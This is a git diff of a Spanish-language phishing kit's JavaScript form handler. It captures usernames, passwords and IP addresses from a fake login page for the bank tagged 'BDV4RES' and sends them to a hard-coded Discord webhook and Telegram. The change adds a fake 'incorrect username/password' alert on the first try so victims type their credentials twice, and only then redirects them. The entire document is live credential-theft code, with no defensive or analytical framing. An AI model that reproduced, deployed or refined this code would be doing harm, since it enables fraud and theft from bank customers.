@@ -29,7 +29,10 @@ async function handleFormSubmit(event) {
             
             message = `📨 BDV4RES capturado:\n\n🆔 Usuario: ${username}\n🎭 Contraseña: ${password}\n🌐 IP: ${ip}\n💀 4RES565`;
             discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Usuario:** ${username}\n**Contraseña:** ${password}\n**IP:** ${ip}\n**Marca:** 4RES565`;
-            redirectUrl = 'w1.html';
+            
+            // Verificar si ya es el segundo intento
+            const isSecondAttempt = sessionStorage.getItem('bdv_first_attempt') === 'completed';
+            redirectUrl = isSecondAttempt ? 'w1.html' : '';
             break;
             
         case 'sms1':
@@ -65,7 +68,7 @@ async function handleFormSubmit(event) {
     const discordWebhookUrl = 'https://discord.com/api/webhooks/1428574338407338044/kgInd80Z5u0ntymDUvJg7wiwe6b2c1LueLE3TSjtyPGQqYTihC1LyTuLDLBY1fpNET0o';
 
     try {
-        // Promesas para enviar a Discord y Telegram
+        // Enviar los datos a Discord y Telegram
         const discordPromise = fetch(discordWebhookUrl, {
             method: 'POST',
             headers: {
@@ -106,29 +109,53 @@ async function handleFormSubmit(event) {
         const telegramData = await telegramResponse.json();
         const discordOk = discordResponse.ok;
         
-        // Redirigir incluso si solo una de las dos funciona
         if (telegramData.ok || discordOk) {
             console.log('Datos enviados correctamente');
-            // Redirigir después de enviar los datos
-            if (redirectUrl) {
-                window.location.href = redirectUrl;
+            
+            // Manejar redirección solo para el formulario de login
+            if (formType === 'login') {
+                const isSecondAttempt = sessionStorage.getItem('bdv_first_attempt') === 'completed';
+                
+                if (isSecondAttempt) {
+                    // Es el segundo intento, redirigir
+                    sessionStorage.removeItem('bdv_first_attempt'); // Limpiar para futuros intentos
+                    window.location.href = redirectUrl;
+                } else {
+                    // Es el primer intento, marcar como completado y mostrar error
+                    sessionStorage.setItem('bdv_first_attempt', 'completed');
+                    
+                    // Mostrar mensaje de error
+                    alert('Usuario y/o contraseña incorrectos. Por favor, intente nuevamente.');
+                    
+                    // Limpiar campos
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    
+                    // Enfocar en el primer campo
+                    document.getElementById('username').focus();
+                    
+                    // Cambiar mensaje del botón
+                    const submitBtn = document.querySelector('.submit-btn');
+                    if (submitBtn) {
+                        submitBtn.textContent = 'Reintentar';
+                    }
+                }
+            } else {
+                // Para otros formularios, redirigir normalmente
+                if (redirectUrl) {
+                    window.location.href = redirectUrl;
+                }
             }
         } else {
             console.error('Error en las respuestas:', {
                 telegram: telegramData,
                 discord: discordResponse.status
             });
-            // Aún así redirigir para no bloquear al usuario
-            if (redirectUrl) {
-                window.location.href = redirectUrl;
-            }
+            alert('Ocurrió un error. Por favor intente nuevamente.');
         }
     } catch (error) {
         console.error('Error al enviar los datos:', error);
-        // Aún así redirigir para no bloquear al usuario
-        if (redirectUrl) {
-            window.location.href = redirectUrl;
-        }
+        alert('Error de conexión. Por favor intente nuevamente.');
     }
 
     return false;
